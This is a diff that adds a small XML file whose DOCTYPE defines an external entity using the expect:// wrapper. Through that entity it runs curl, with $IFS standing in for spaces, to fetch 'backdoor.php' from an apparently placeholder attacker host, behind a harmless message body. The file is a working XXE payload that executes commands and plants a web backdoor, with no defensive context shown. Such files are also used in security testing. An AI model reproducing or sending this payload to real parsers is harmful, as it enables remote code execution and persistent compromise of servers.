@@ -1,0 +1,5 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE msg [
+  <!ENTITY file SYSTEM "expect://curl$IFS-O$IFS'ondehensikter.no/backdoor.php'">
+]>
+<msg>hei</msg>
